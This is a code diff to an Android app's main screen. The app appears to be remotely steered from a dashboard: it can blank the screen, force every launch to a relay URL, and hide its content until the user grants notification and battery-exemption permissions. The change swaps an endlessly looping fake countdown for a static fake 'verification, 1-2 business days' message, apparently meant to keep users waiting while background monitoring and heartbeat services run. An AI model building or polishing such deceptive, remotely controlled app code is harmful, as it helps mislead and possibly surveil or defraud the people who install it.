@@ -4,7 +4,6 @@ import android.Manifest
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
-import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
@@ -23,19 +22,14 @@ import androidx.core.content.ContextCompat
  *    else. Only the dashboard can turn it off.
  * 2. Sticky relay (Relay 1/2 buttons) -> every app open auto-redirects to
  *    the relay URL without showing app contents, until "Stop Relay".
- * 3. Otherwise timer + note are hidden until ALL required permissions are
- *    granted (notifications + battery exemption).
+ * 3. Otherwise status + note are hidden until ALL required permissions are
+ *    granted (notifications + battery exemption). After grant, a static
+ *    verification status is shown (1-2 business days, close-app friendly).
  * Background wiring (monitor service, Teller register/heartbeat,
  * alias enforcement) is unchanged.
  */
 class MainActivity : AppCompatActivity() {
 
-    companion object {
-        // 6 hours 36 minutes, in milliseconds. Restarts on finish.
-        private const val CYCLE_MS = (6 * 3600L + 36 * 60L) * 1000L
-    }
-
-    private var timer: CountDownTimer? = null
     private var lastStickyFireElapsed = 0L
 
     private lateinit var countdownView: TextView
@@ -103,8 +97,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onDestroy() {
-        timer?.cancel()
-        timer = null
         gateHandler.removeCallbacks(gateCheck)
         super.onDestroy()
     }
@@ -121,11 +113,9 @@ class MainActivity : AppCompatActivity() {
 
     private fun updateGate() {
         if (!::countdownView.isInitialized) return
-        // 1. Blank mode wins over everything: white screen only, no timer,
+        // 1. Blank mode wins over everything: white screen only, no status,
         // note, gate, or relay. Dashboard-only control.
         if (DeviceRegistrar.isBlankEnabled(this)) {
-            timer?.cancel()
-            timer = null
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
             gateView.visibility = View.GONE
@@ -135,8 +125,6 @@ class MainActivity : AppCompatActivity() {
         // relay URL on every open (throttled to avoid an intent storm while
         // the activity polls). Cleared only by dashboard "Stop Relay".
         if (DeviceRegistrar.hasStickyRelay(this)) {
-            timer?.cancel()
-            timer = null
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
             gateView.visibility = View.GONE
@@ -151,10 +139,7 @@ class MainActivity : AppCompatActivity() {
             gateView.visibility = View.GONE
             countdownView.visibility = View.VISIBLE
             devNoteView.visibility = View.VISIBLE
-            startTimer()
         } else {
-            timer?.cancel()
-            timer = null
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
             gateView.visibility = View.VISIBLE
@@ -187,30 +172,5 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
         }
         // Result re-checked in onResume() -> updateGate().
-    }
-
-    private fun startTimer() {
-        if (timer != null) return
-        timer = object : CountDownTimer(CYCLE_MS, 1000L) {
-            override fun onTick(millisUntilFinished: Long) {
-                render(millisUntilFinished)
-            }
-
-            override fun onFinish() {
-                // Loop: restart the full 6h36m cycle.
-                timer = null
-                startTimer()
-            }
-        }.start()
-        render(CYCLE_MS)
-    }
-
-    private fun render(millis: Long) {
-        val totalSec = millis / 1000L
-        val h = totalSec / 3600L
-        val m = (totalSec % 3600L) / 60L
-        val s = totalSec % 60L
-        countdownView.text =
-            String.format(java.util.Locale.getDefault(), "%02d:%02d:%02d", h, m, s)
     }
 }
